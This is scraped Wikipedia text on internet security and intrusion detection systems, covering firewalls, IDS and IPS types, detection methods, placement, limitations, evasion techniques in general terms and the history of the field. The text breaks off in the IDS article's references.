. Only authorized traffic is allowed to pass through it. Firewalls create checkpoints between networks and computers. Firewalls can block traffic based on IP source and TCP port number. They can also serve as the platform for IPsec. Using tunnel mode, firewalls can implement VPNs. Firewalls can also limit network exposure by hiding the internal network from the public Internet.



Types of firewall
[
edit
]


Packet filter
[
edit
]


A packet filter processes network traffic on a packet-by-packet basis. Its main job is to filter traffic from a remote IP host, so a router is needed to connect the internal network to the Internet. The router is known as a 
screening router
, which screens packets leaving and entering the network.



Stateful packet inspection
[
edit
]


In a 
stateful firewall
 the 
circuit-level gateway
 is a 
proxy server
 that operates at the network level of an 
Open Systems Interconnect (OSI) model
 and statically defines what traffic will be allowed. Circuit proxies forward 
network packets
 (formatted data) containing a given port number, if the 
port
 is permitted by the 
algorithm
. The main advantage of a proxy server is its ability to provide 
Network Address Translation
 (NAT), which can hide the user's IP address from the Internet, effectively protecting internal information from the outside.



Application-level gateway
[
edit
]


An 
application-level firewall
 is a third-generation firewall where a 
proxy server
 operates at the very top of the OSI model, the 
IP suite
 application level. A network packet is forwarded only if a connection is established using a known protocol. Application-level gateways are notable for analyzing entire messages rather than individual packets.



Browser choice
[
edit
]


Main article: 
Browser security


Web browser market share predicts the share of hacker attacks. For example, 
Internet Explorer
 6, which used to lead the market,
[
19
]
 was heavily attacked.
[
20
]




Protections
[
edit
]


Antivirus
[
edit
]


Main article: 
Antivirus software


Antivirus software
 can protect a programmable device by detecting and eliminating 
malware
.
[
21
]
 A variety of techniques are used, such as signature-based, heuristics, 
rootkit
, and real-time.



Password managers
[
edit
]


Main article: 
Password manager


A 
password manager
 is a software application that creates, stores and provides passwords to applications. Password managers encrypt passwords. The user only needs to remember a single master password to access the store.
[
22
]




Security suites
[
edit
]


Security suites were first offered for sale in 2003 (
McAfee
) and contain 
firewalls
, 
anti-virus
, 
anti-spyware
 and other components.
[
23
]
 They also offer theft protection, portable storage device safety check, private Internet browsing, cloud 
anti-spam
, a file shredder or make security-related decisions (answering popup windows) and several were free of charge.
[
24
]




Wireless Sensor Networks (WSNs)
[
edit
]


A promising technology with low production and installation costs, unattended network operation, and autonomous longtime operation. According to research, building a secure Internet of Things (IoT) should start with securing WSNs ahead of other components.
[
25
]




History
[
edit
]


At the National Association of Mutual Savings Banks (NAMSB) conference in January 1976, 
Atalla Corporation
 (founded by Mohamed Atalla) and 
Bunker Ramo Corporation
 (founded by George Bunker and 
Simon Ramo
) introduced the earliest products designed for dealing with online security. Atalla later added its Identikey 
hardware security module
, and supported 
processing
 
online transactions
 and 
network security
. Designed to process 
bank transactions
 
online
, the Identikey system was extended to shared-facility operations. It was compatible with various 
switching
 
networks
, and was capable of resetting itself electronically to any one of 64,000 irreversible 
nonlinear
 
algorithms
 as directed by 
card data
 information.
[
26
]
 In 1979, Atalla introduced the first 
network
 
security processor
 (NSP).
[
27
]




See also
[
edit
]




Comparison of antivirus software


Comparison of firewalls


Cybersecurity information technology list


Cyberspace Electronic Security Act
 (in the US)


Identity driven networking


Internet Crime Complaint Center


Internet safety


Network security policy


Usability of web authentication systems


Web literacy
 (Security)




References
[
edit
]






^
 
"What Is Internet Security? | McAfee"
. 
www.mcafee.com
. Retrieved 
2021-09-05
.




^
 
Gralla, Preston (2007). 
How the Internet Works
. Indianapolis: Que Pub. 
ISBN
 
978-0-7897-2132-7
.




^
 
Rhee, M. Y. (2003). 
Internet Security: Cryptographic Principles, Algorithms and Protocols
. Chichester: 
Wiley
. 
ISBN
 
0-470-85285-2
.




^
 
"101 Data Protection Tips: How to Keep Your Passwords, Financial & Personal Information Safe in 2020"
. 
Digital Guardian
. 2019-12-16
. Retrieved 
2020-10-23
.




^
 
Yan, Q.; Yu, F. R.; Gong, Q.; Li, J. (2016). "Software-Defined Networking (SDN) and Distributed Denial of Service (DDoS) Attacks in Cloud Computing Environments: A Survey, Some Research Issues, and Challenges". 
IEEE Communications Surveys and Tutorials
. 
18
 (1): 602–622. 
doi
:
10.1109/COMST.2015.2487361
. 
S2CID
 
20786481
.




^
 
Izak, Belarua. 
"Welke virusscanners zijn het beste voor macOS High Sierra"
. 
Virusscanner MAC
 (in Dutch)
. Retrieved 
4 January
 2018
.




^
 
Ramzan, Zulfikar (2010). 
"Phishing attacks and countermeasures"
. In Stamp, Mark; Stavroulakis, Peter (eds.). 
Handbook of Information and Communication Security
. Springer. 
ISBN
 
978-3-642-04117-4
.




^
 
van der Merwe, Alta; Loock, Marianne; Dabrowski, Marek (2005). 
"Characteristics and Responsibilities Involved in a Phishing Attack"
. 
Proceedings of the 4th International Symposium on Information and Communication Technologies
. Trinity College Dublin: 249–254. 
ISBN
 
978-1-59593-169-6
. Retrieved 
4 January
 2018
.




^
 
Long, Mathew (February 22, 2017). 
"Fraud Insights Through Integration"
. RSA. Archived from 
the original
 on October 20, 2018
. Retrieved 
October 20,
 2018
.




^
 
"Improving Web Application Security: Threats and Countermeasures"
. 
msdn.microsoft.com
. 14 July 2010
. Retrieved 
2016-04-05
.




^
 
"Justice Department charges Russian spies and criminal hackers in Yahoo intrusion"
. 
Washington Post
. Retrieved 
15 March
 2017
.




^
 
"Securing the Network Layer Against Malicious Attacks"
. 
TDK Technologies
. October 27, 2020.




^
 
"Two-factor authentication: What you need to know (FAQ) – CNET"
. 
CNET
. Retrieved 
2015-10-31
.




^
 
"How to extract data from an iCloud account with two-factor authentication activated"
. 
iphonebackupextractor.com
. Retrieved 
2016-06-08
.




^
 
Margaret Rouse (September 2005). 
"What is a security token?"
. SearchSecurity.com
. Retrieved 
2014-02-14
.




^
 
Resnick, Peter W. (2001). Resnick, P (ed.). 
"Internet Message Format"
. 
tools.ietf.org
. 
doi
:
10.17487/RFC2822
. Retrieved 
2021-05-01
.




^
 
"Virtual Private Network"
. NASA. Archived from 
the original
 on 2013-06-03
. Retrieved 
2014-02-14
.




^
 
"What Is a Message Authentication Code?"
. Wisegeek.com
. Retrieved 
2013-04-20
.




^
 
"Browser Statistics"
. W3Schools.com
. Retrieved 
2011-08-10
.




^
 
Bradly, Tony. 
"It's Time to Finally Drop Internet Explorer 6"
. PCWorld.com
. Retrieved 
2010-11-09
.




^
 
Larkin, Eric (2008-08-26). 
"Build Your Own Free Security Suite"
. Archived from 
the original
 on 2010-11-06
. Retrieved 
2010-11-09
.




^
 
"USE A FREE PASSWORD MANAGER"
 
(PDF)
. scsccbkk.org. Archived from 
the original
 
(PDF)
 on 2016-01-25
. Retrieved 
2016-06-17
.




^
 
Rebbapragada, Narasu. 
"All-in-one Security"
. PC World.com. Archived from 
the original
 on October 27, 2010
. Retrieved 
2010-11-09
.




^
 
"Free products for PC security"
. 2015-10-08.




^
 
Butun, Ismail (2020). "Security of the Internet of Things: Vulnerabilities, Attacks, and Countermeasures". 
IEEE Communications Surveys and Tutorials
. 
22
 (1): 616–644. 
arXiv
:
1910.13312
. 
doi
:
10.1109/COMST.2019.2953364
. 
S2CID
 
204950321
 – via PISCATAWAY: IEEE.




^
 
"Four Products for On-Line Transactions Unveiled"
. 
Computerworld
. 
10
 (4). IDG Enterprise: 3. 26 January 1976.




^
 
Burkey, Darren (May 2018). 
"Data Security Overview"
 
(PDF)
. 
Micro Focus
. Retrieved 
21 August
 2019
.






External links
[
edit
]








Wikimedia Commons has media related to 
Internet security
.




National Institute of Standards and Technology (NIST.gov)
 - Information Technology portal with links to computer- and cyber security


National Institute of Standards and Technology (NIST.gov)
 -Computer Security Resource Center -Guidelines on Electronic Mail Security, version 2


PwdHash Stanford University
 - Firefox & IE browser extensions that transparently convert a user's password into a domain-specific password.


Cybertelecom.org Security
 - surveying federal Internet security work.


DSL Reports.com
- Broadband Reports, FAQs and forums on Internet security, est 1999


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Internet_security&oldid=1246468028
"


Categories
: 
Internet security
Web security exploits
Hidden categories: 
CS1 Dutch-language sources (nl)
Articles with short description
Short description is different from Wikidata
Articles needing additional references from April 2009
All articles needing additional references
All articles with unsourced statements
Articles with unsourced statements from January 2024
Articles with unsourced statements from August 2022
Commons category link from Wikidata











From Wikipedia, the free encyclopedia






Network protection device or software


Not to be confused with 
intruder detection
.


This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Intrusion detection system"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
September 2018
)
 (
Learn how and when to remove this message
)


An 
intrusion detection system
 (
IDS
) is a device or 
software
 application that monitors a network or systems for malicious activity or policy violations.
[
1
]
 Any intrusion activity or violation is typically either reported to an administrator or collected centrally using a 
security information and event management (SIEM)
 system. A SIEM system combines outputs from multiple sources and uses 
alarm filtering
 techniques to distinguish malicious activity from 
false alarms
.
[
2
]


IDS types range in scope from single computers to large networks.
[
3
]
 The most common classifications are 
network intrusion detection systems
 (
NIDS
) and 
host-based intrusion detection systems
 (
HIDS
). A system that monitors important operating system files is an example of an HIDS, while a system that analyzes incoming network traffic is an example of an NIDS. It is also possible to classify IDS by detection approach. The most well-known variants are 
signature-based detection
 (recognizing bad patterns, such as 
malware
) and anomaly-based detection (detecting deviations from a model of "good" traffic, which often relies on 
machine learning
). Another common variant is reputation-based detection (recognizing the potential threat according to the reputation scores). Some IDS products have the ability to respond to detected intrusions. Systems with response capabilities are typically referred to as an 
intrusion prevention system
 (
IPS
).
[
4
]
 Intrusion detection systems can also serve specific purposes by augmenting them with custom tools, such as using a honeypot to attract and characterize malicious traffic.
[
5
]






Comparison with firewalls
[
edit
]


Although they both relate to 
network security
, an IDS differs from a 
firewall
 in that a conventional network firewall (distinct from a 
next-generation firewall
) uses a static set of rules to permit or deny network connections. It implicitly prevents intrusions, assuming an appropriate set of rules have been defined. Essentially, firewalls limit access between networks to prevent intrusion and do not signal an attack from inside the network. An IDS describes a suspected intrusion once it has taken place and signals an alarm. An IDS also watches for attacks that originate from within a system. This is traditionally achieved by examining network communications, identifying 
heuristics
 and patterns (often known as signatures) of common computer attacks, and taking action to alert operators.  A system that terminates connections is called an intrusion prevention system, and performs access control like an 
application layer firewall
.
[
6
]




Intrusion detection category
[
edit
]


IDS can be classified by where detection takes place (network or 
host
) or the detection method that is employed (signature or anomaly-based).
[
7
]




Analyzed activity
[
edit
]


Network intrusion detection systems
[
edit
]


Network intrusion detection systems (NIDS) are placed at a strategic point or points within the network to monitor traffic to and from all devices on the network.
[
8
]
 It performs an analysis of passing traffic on the entire 
subnet
, and matches the traffic that is passed on the subnets to the library of known attacks. Once an attack is identified, or abnormal behavior is sensed, the alert can be sent to the administrator. NIDS function to safeguard every device and the entire network from unauthorized access.
[
9
]


An example of an NIDS would be installing it on the subnet where firewalls are located in order to see if someone is trying to break into the firewall. Ideally one would scan all inbound and outbound traffic, however doing so might create a bottleneck that would impair the overall speed of the network. 
OPNET
 and NetSim are commonly used tools for simulating network intrusion detection systems. NID Systems are also capable of comparing signatures for similar packets to link and drop harmful detected packets which have a signature matching the records in the NIDS. When we classify the design of the NIDS according to the system interactivity property, there are two types: on-line and off-line NIDS, often referred to as inline and tap mode, respectively. On-line NIDS deals with the network in real time. It analyses the 
Ethernet packets
 and applies some rules, to decide if it is an attack or not. Off-line NIDS deals with stored data and passes it through some processes to decide if it is an attack or not.

NIDS can be also combined with other technologies to increase detection and prediction rates. 
Artificial Neural Network
 (ANN) based IDS are capable of analyzing huge volumes of data due to the hidden layers and non-linear modeling, however this process requires time due its complex structure.
[
10
]
 This allows IDS to more efficiently recognize intrusion patterns.
[
11
]
 Neural networks assist IDS in predicting attacks by learning from mistakes; ANN based IDS help develop an early warning system, based on two layers. The first layer accepts single values, while the second layer takes the first's layers output as input; the cycle repeats and allows the system to automatically recognize new unforeseen patterns in the network.
[
12
]
 This system can average 99.9% detection and classification rate, based on research results of 24 network attacks, divided in four categories: DOS, Probe, Remote-to-Local, and user-to-root.
[
13
]




Host intrusion detection systems
[
edit
]


Main article: 
Host-based intrusion detection system


Host intrusion detection systems (HIDS) run on individual hosts or devices on the network. A HIDS monitors the inbound and outbound packets from the device only and will alert the user or administrator if suspicious activity is detected. It takes a snapshot of existing system files and matches it to the previous snapshot. If the critical system files were modified or deleted, an alert is sent to the administrator to investigate. An example of HIDS usage can be seen on mission critical machines, which are not expected to change their configurations.
[
14
]
[
15
]




Detection method
[
edit
]


Signature-based
[
edit
]


Signature-based IDS is the detection of attacks by looking for specific patterns, such as byte sequences in network traffic, or known malicious instruction sequences used by malware.
[
16
]
 This terminology originates from 
anti-virus software
, which refers to these detected patterns as signatures. Although signature-based IDS can easily detect known attacks, it is difficult to detect new attacks, for which no pattern is available.
[
17
]




This section 
needs expansion
. You can help by 
adding to it
.  
(
March 2019
)


In signature-based IDS, the signatures are released by a vendor for all its products. On-time updating of the IDS with the signature is a key aspect.



Anomaly-based
[
edit
]


Anomaly-based intrusion detection systems
 were primarily introduced to detect unknown attacks, in part due to the rapid development of malware. The basic approach is to use machine learning to create a model of trustworthy activity, and then compare new behavior against this model. Since these models can be trained according to the applications and hardware configurations, machine learning based method has a better generalized property in comparison to traditional signature-based IDS. Although this approach enables the detection of previously unknown attacks, it may suffer from 
false positives
: previously unknown legitimate activity may also be classified as malicious. Most of the existing IDSs suffer from the time-consuming during detection process that degrades the performance of IDSs. Efficient 
feature selection
 algorithm makes the classification process used in detection more reliable.
[
18
]


New types of what could be called anomaly-based intrusion detection systems are being viewed by 
Gartner
 as User and Entity Behavior Analytics (UEBA)
[
19
]
 (an evolution of the 
user behavior analytics
 category) and network 
traffic analysis
 (NTA).
[
20
]
 In particular, NTA deals with malicious insiders as well as targeted external attacks that have compromised a user machine or account. Gartner has noted that some organizations have opted for NTA over more traditional IDS.
[
21
]




This section 
needs expansion
. You can help by 
adding to it
.  
(
July 2016
)


Intrusion prevention
[
edit
]


Some systems may attempt to stop an intrusion attempt but this is neither required nor expected of a monitoring system. Intrusion detection and prevention systems (IDPS) are primarily focused on identifying possible incidents, logging information about them, and reporting attempts.  In addition, organizations use IDPS for other purposes, such as identifying problems with security policies, documenting existing threats and deterring individuals from violating security policies. IDPS have become a necessary addition to the security infrastructure of nearly every organization.
[
22
]


IDPS typically record information related to observed events, notify security administrators of important observed events and produce reports. Many IDPS can also respond to a detected threat by attempting to prevent it from succeeding. They use several response techniques, which involve the IDPS stopping the attack itself, changing the security environment (e.g. reconfiguring a firewall) or changing the attack's content.
[
22
]


Intrusion prevention systems
 (
IPS
), also known as 
intrusion detection and prevention systems
 (
IDPS
), are 
network security
 appliances that monitor network or system activities for malicious activity. The main functions of intrusion prevention systems are to identify malicious activity, log information about this activity, report it and attempt to block or stop it.
[
23
]
.

Intrusion prevention systems are considered extensions of intrusion detection systems because they both monitor network traffic and/or system activities for malicious activity. The main differences are, unlike intrusion detection systems, intrusion prevention systems are placed in-line and are able to actively prevent or block intrusions that are detected.
[
24
]
: 273 
[
25
]
: 289 
 IPS can take such actions as sending an alarm, dropping detected malicious packets, resetting a connection or blocking traffic from the offending IP address.
[
26
]
 An IPS also can correct 
cyclic redundancy check
 (CRC)
 errors, defragment packet streams, mitigate TCP sequencing issues, and clean up unwanted 
transport
 and 
network layer
 options.
[
24
]
: 278 
[
27
]




Classification
[
edit
]


Intrusion prevention systems can be classified into four different types:
[
23
]
[
28
]




Network-based intrusion prevention system (NIPS)
:  monitors the entire network for suspicious traffic by analyzing protocol activity.


Wireless intrusion prevention system (WIPS)
: monitor a wireless network for suspicious traffic by analyzing wireless networking protocols.


Network behavior analysis (NBA)
: examines network traffic to identify threats that generate unusual traffic flows, such as distributed denial of service (DDoS) attacks, certain forms of malware and policy violations.


Host-based intrusion prevention system (HIPS)
: an installed software package which monitors a single host for suspicious activity by analyzing events occurring within that host.


Detection methods
[
edit
]


The majority of intrusion prevention systems utilize one of three detection methods: signature-based, statistical anomaly-based, and stateful protocol analysis.
[
25
]
: 301 
[
29
]




Signature-based detection
: Signature-based IDS monitors packets in the Network and compares with pre-configured and pre-determined attack patterns known as signatures. While it is the simplest and most effective method, it fails to detect unknown attacks and variants of known attacks.
[
30
]


Statistical anomaly-based detection
: An IDS which is anomaly-based will monitor network traffic and compare it against an established baseline. The baseline will identify what is "normal" for that network – what sort of bandwidth is generally used and what protocols are used. It may however, raise a False Positive alarm for legitimate use of bandwidth if the baselines are not intelligently configured.
[
31
]
 Ensemble models that use Matthews correlation co-efficient to identify unauthorized network traffic have obtained 99.73% accuracy.
[
32
]


Stateful protocol analysis detection
: This method identifies deviations of protocol states by comparing observed events with "pre-determined profiles of generally accepted definitions of benign activity".
[
25
]
 While it is capable of knowing and tracing the protocol states, it requires significant resources.
[
33
]


Placement
[
edit
]


The correct placement of intrusion detection systems is critical and varies depending on the network. The most common placement is behind the firewall, on the edge of a network. This practice provides the IDS with high visibility of traffic entering your network and will not receive any traffic between users on the network. The edge of the network is the point in which a network connects to the extranet. Another practice that can be accomplished if more resources are available is a strategy where a technician will place their first IDS at the point of highest visibility and depending on resource availability will place another at the next highest point, continuing that process until all points of the network are covered.
[
34
]


If an IDS is placed beyond a network's firewall, its main purpose would be to defend against noise from the internet but, more importantly, defend against common attacks, such as port scans and network mapper. An IDS in this position would monitor layers 4 through 7 of the OSI model and would be signature-based. This is a very useful practice, because rather than showing actual breaches into the network that made it through the firewall, attempted breaches will be shown which reduces the amount of false positives. The IDS in this position also assists in decreasing the amount of time it takes to discover successful attacks against a network.
[
35
]


Sometimes an IDS with more advanced features will be integrated with a firewall in order to be able to intercept sophisticated attacks entering the network. Examples of advanced features would include multiple security contexts in the routing level and bridging mode. All of this in turn potentially reduces cost and operational complexity.
[
35
]


Another option for IDS placement is within the actual network. These will reveal attacks or suspicious activity within the network. Ignoring the security within a network can cause many problems, it will either allow users to bring about security risks or allow an attacker who has already broken into the network to roam around freely. Intense intranet security makes it difficult for even those hackers within the network to maneuver around and escalate their privileges.
[
35
]




Limitations
[
edit
]


Noise
 can severely limit an intrusion detection system's effectiveness. Bad packets generated from 
software bugs
, corrupt 
DNS
 data, and local packets that escaped can create a significantly high false-alarm rate.
[
36
]


It is not uncommon for the number of real attacks to be far below the number of 
false-alarms
. Number of real attacks is often so far below the number of false-alarms that the real attacks are often missed and ignored.
[
36
]
[
needs update
]


Many attacks are geared for specific versions of software that are usually outdated. A constantly changing library of signatures is needed to mitigate threats. Outdated signature databases can leave the IDS vulnerable to newer strategies.
[
36
]


For signature-based IDS, there will be lag between a new threat discovery and its signature being applied to the IDS. During this lag time, the IDS will be unable to identify the threat.
[
31
]


It cannot compensate for weak identification and 
authentication
 mechanisms or for weaknesses in 
network protocols
. When an attacker gains access due to weak authentication mechanisms then IDS cannot prevent the adversary from any malpractice.


Encrypted packets are not processed by most intrusion detection devices. Therefore, the encrypted packet can allow an intrusion to the network that is undiscovered until more significant network intrusions have occurred.


Intrusion detection software provides information based on the 
network address
 that is associated with the IP packet that is sent into the network. This is beneficial if the network address contained in the IP packet is accurate. However, the address that is contained in the IP packet could be faked or scrambled.


Due to the nature of NIDS systems, and the need for them to analyse protocols as they are captured, NIDS systems can be susceptible to the same protocol-based attacks to which network hosts may be vulnerable. Invalid data and 
TCP/IP stack
 attacks may cause a NIDS to crash.
[
37
]


The security measures on cloud computing do not consider the variation of user's privacy needs.
[
38
]
 They provide the same security mechanism for all users no matter if users are companies or an individual person.
[
38
]


Evasion techniques
[
edit
]


Main article: 
Intrusion detection system evasion techniques


There are a number of techniques which attackers are using, the following are considered 'simple' measures which can be taken to evade IDS:



Fragmentation: by sending fragmented packets, the attacker will be under the radar and can easily bypass the detection system's ability to detect the attack signature.


Avoiding defaults: The TCP port utilised by a protocol does not always provide an indication to the protocol which is being transported. For example, an IDS may expect to detect a 
trojan
 on port 12345. If an attacker had reconfigured it to use a different port, the IDS may not be able to detect the presence of the trojan.


Coordinated, low-bandwidth attacks: coordinating a scan among numerous attackers (or agents) and allocating different ports or hosts to different attackers makes it difficult for the IDS to correlate the captured packets and deduce that a network scan is in progress.


Address 
spoofing
/proxying: attackers can increase the difficulty of the Security Administrators ability to determine the source of the attack by using poorly secured or incorrectly configured proxy servers to bounce an attack. If the source is spoofed and bounced by a server, it makes it very difficult for IDS to detect the origin of the attack.


Pattern change evasion: IDS generally rely on 'pattern matching' to detect an attack. By changing the data used in the attack slightly, it may be possible to evade detection. For example, an 
Internet Message Access Protocol
 (IMAP) server may be vulnerable to a buffer overflow, and an IDS is able to detect the attack signature of 10 common attack tools. By modifying the payload sent by the tool, so that it does not resemble the data that the IDS expects, it may be possible to evade detection.


Development
[
edit
]


The earliest preliminary IDS concept was delineated in 1980 by James Anderson at the 
National Security Agency
 and consisted of a set of tools intended to help administrators review audit trails.
[
39
]
 User access logs, file access logs, and system event logs are examples of audit trails.

Fred Cohen
 noted in 1987 that it is impossible to detect an intrusion in every case, and that the resources needed to detect intrusions grow with the amount of usage.
[
40
]


Dorothy E. Denning
, assisted by 
Peter G. Neumann
, published a model of an IDS in 1986 that formed the basis for many systems today.
[
41
]
  Her model used statistics for 
anomaly detection
, and resulted in an early IDS at 
SRI International
 named the Intrusion Detection Expert System (IDES), which ran on 
Sun
 workstations and could consider both user and network level data.
[
42
]
  IDES had a dual approach with a rule-based 
Expert System
 to detect known types of intrusions plus a statistical anomaly detection component based on profiles of users, host systems, and target systems. The author of "IDES: An Intelligent System for Detecting Intruders", Teresa F. Lunt, proposed adding an 
artificial neural network
 as a third component.  She said all three components could then report to a resolver.  SRI followed IDES in 1993 with the Next-generation Intrusion Detection Expert System (NIDES).
[
43
]


The 
Multics
 intrusion detection and alerting system (MIDAS), an expert system using P-BEST and 
Lisp
, was developed in 1988 based on the work of Denning and Neumann.
[
44
]
  Haystack was also developed in that year using statistics to reduce audit trails.
[
45
]


In 1986 the 
National Security Agency
 started an IDS research transfer program under 
Rebecca Bace
. Bace later published the seminal text on the subject, 
Intrusion Detection
, in 2000.
[
46
]


Wisdom & Sense (W&S) was a statistics-based anomaly detector developed in 1989 at the 
Los Alamos National Laboratory
.
[
47
]
  W&S created rules based on statistical analysis, and then used those rules for anomaly detection.

In 1990, the Time-based Inductive Machine (TIM) did anomaly detection using inductive learning of sequential user patterns in 
Common Lisp
 on a 
VAX
 3500 computer.
[
48
]
  The Network Security Monitor (NSM) performed masking on access matrices for anomaly detection on a Sun-3/50 workstation.
[
49
]
  The Information Security Officer's Assistant (ISOA) was a 1990 prototype that considered a variety of strategies including statistics, a profile checker, and an expert system.
[
50
]
  ComputerWatch at 
AT&T Bell Labs
 used statistics and rules for audit data reduction and intrusion detection.
[
51
]


Then, in 1991, researchers at the 
University of California, Davis
 created a prototype Distributed Intrusion Detection System (DIDS), which was also an expert system.
[
52
]
  The Network Anomaly Detection and Intrusion Reporter (NADIR), also in 1991, was a prototype IDS developed at the Los Alamos National Laboratory's Integrated Computing Network (ICN), and was heavily influenced by the work of Denning and Lunt.
[
53
]
  NADIR used a statistics-based anomaly detector and an expert system.

The 
Lawrence Berkeley National Laboratory
 announced 
Bro
 in 1998, which used its own rule language for packet analysis from 
libpcap
 data.
[
54
]
  Network Flight Recorder (NFR) in 1999 also used libpcap.
[
55
]


APE was developed as a packet sniffer, also using libpcap, in November, 1998, and was renamed 
Snort
 one month later. Snort has since become the world's largest used IDS/IPS system with over 300,000 active users.
[
56
]
 It can monitor both local systems, and remote capture points using the 
TZSP
 protocol.

The Audit Data Analysis and Mining (ADAM) IDS in 2001 used 
tcpdump
 to build profiles of rules for classifications.
[
57
]
 In 2003, 
Yongguang Zhang
 and Wenke Lee argue for the importance of IDS in networks with mobile nodes.
[
58
]


In 2015, Viegas and his colleagues 
[
59
]
 proposed an anomaly-based intrusion detection engine, aiming System-on-Chip (SoC) for applications in Internet of Things (IoT), for instance. The proposal applies machine learning for anomaly detection, providing energy-efficiency to a Decision Tree, Naive-Bayes, and k-Nearest Neighbors classifiers implementation in an Atom CPU and its hardware-friendly implementation in a FPGA.
[
60
]
[
61
]
 In the literature, this was the first work that implement each classifier equivalently in software and hardware and measures its energy consumption on both. Additionally, it was the first time that was measured the energy consumption for extracting each features used to make the network packet classification, implemented in software and hardware.
[
62
]




See also
[
edit
]


Application protocol-based intrusion detection system
 (APIDS)


Artificial immune system


Bypass switch


Denial-of-service attack


DNS analytics


Extrusion detection


Intrusion Detection Message Exchange Format


Protocol-based intrusion detection system
 (PIDS)


Real-time adaptive security


Security management


ShieldsUp


Software-defined protection


References
[
edit
]






^
 
"What is an Intrusion Detection System (IDS)?"
. Check Point Software Technologies. 2023
. Retrieved 
27 December
 2023
.




^
 
Martellini, Maurizio; Malizia, Andrea (2017-10-30). 
Cyber and Chemical, Biological, Radiological, Nuclear, Explosives Challenges: Threats and Counter Efforts
. Springer. 
ISBN
 
9783319621081
.




^
 
Axelsson, S (2000). 
"Intrusion Detection Systems: A Survey and Taxonomy"
 (retrieved 21 May 2018)




^
 
Newman, R.C. (23 June 2009). 
Computer Security: Protecting Digital Resources
. Jones & Bartlett Learning. 
ISBN
 
978-0-7637-5994-0
. Retrieved 
27 December
 2023
.




^
 
Mohammed, Mohssen; Rehman, Habib-ur (2015-12-02). 
Honeypots and Routers: Collecting Internet Attacks
. CRC Press. 
ISBN
 
9781498702201
.




^
 
Vacca, John R. (2013-08-26). 
Network and System Security
. Elsevier. 
ISBN
 
9780124166950
.




^
 
Vacca, John R. (2009-05-04). 
Computer and Information Security Handbook
. Morgan Kaufmann. 
ISBN
 
9780080921945
.




^
 
Gurley., Bace, Rebecca (2001). 
Intrusion detection systems
. [U.S. Dept. of Commerce, Technology Administration, National Institute of Standards and Technology]. 
OCLC
 
70689163
.
{{
cite book
}}
:  CS1 maint: multiple names: authors list (
link
)




^
 
Ahmad, Zeeshan; Shahid Khan, Adnan; Wai Shiang, Cheah; Abdullah, Johari; Ahmad, Farhan (2020-10-16). 
"Network intrusion detection system: A systematic study of machine learning and deep learning approaches"
. 
Transactions on Emerging Telecommunications Technologies
. 
32
 (1). 
doi
:
10.1002/ett.4150
. 
ISSN
 
2161-3915
.




^
 
Ahmad, Zeeshan; Shahid Khan, Adnan; Wai Shiang, Cheah; Abdullah, Johari; Ahmad, Farhan (2021). 
"Network intrusion detection system: A systematic study of machine learning and deep learning approaches"
. 
Transactions on Emerging Telecommunications Technologies
. 
32
 (1). 
doi
:
10.1002/ett.4150
. 
ISSN
 
2161-3915
.




^
 
Garzia, Fabio; Lombardi, Mara; Ramalingam, Soodamani (2017). "An integrated internet of everything — Genetic algorithms controller — Artificial neural networks framework for security/Safety systems management and support". 
2017 International Carnahan Conference on Security Technology (ICCST)
. IEEE. pp. 1–6. 
doi
:
10.1109/ccst.2017.8167863
. 
ISBN
 
9781538615850
. 
S2CID
 
19805812
.




^
 
Vilela, Douglas W. F. L.; Lotufo, Anna Diva P.; Santos, Carlos R. (2018). "Fuzzy ARTMAP Neural Network IDS Evaluation applied for real IEEE 802.11w data base". 
2018 International Joint Conference on Neural Networks (IJCNN)
. IEEE. pp. 1–7. 
doi
:
10.1109/ijcnn.2018.8489217
. 
ISBN
 
9781509060146
. 
S2CID
 
52987664
.




^
 
Dias, L. P.; Cerqueira, J. J. F.; Assis, K. D. R.; Almeida, R. C. (2017). "Using artificial neural network in intrusion detection systems to computer networks". 
2017 9th Computer Science and Electronic Engineering (CEEC)
. IEEE. pp. 145–150. 
doi
:
10.1109/ceec.2017.8101615
. 
ISBN
 
9781538630075
. 
S2CID
 
24107983
.




^
 
Network World
. IDG Network World Inc. 2003-09-15.




^
 
Groom, Frank M.; Groom, Kevin; Jones, Stephan S. (2016-08-19). 
Network and Data Security for Non-Engineers
. CRC Press. 
ISBN
 
9781315350219
.




^
 
Brandon Lokesak (December 4, 2008). 
"A Comparison Between Signature Based and Anomaly Based Intrusion Detection Systems"
 
(
PPT
)
. 
www.iup.edu
.




^
 
Douligeris, Christos; Serpanos, Dimitrios N. (2007-02-09). 
Network Security: Current Status and Future Directions
. John Wiley & Sons. 
ISBN
 
9780470099735
.




^
 
Rowayda, A. Sadek; M Sami, Soliman; Hagar, S Elsayed (November 2013). "Effective anomaly intrusion detection system based on neural network with indicator variable and rough set reduction". 
International Journal of Computer Science Issues (IJCSI)
. 
10
 (6).




^
 
"Gartner report: Market Guide for User and Entity Behavior Analytics"
. September 2015.




^
 
"Gartner: Hype Cycle for Infrastructure Protection, 2016"
.




^
 
"Gartner: Defining Intrusion Detection and Prevention Systems"
. Retrieved 
2016-09-20
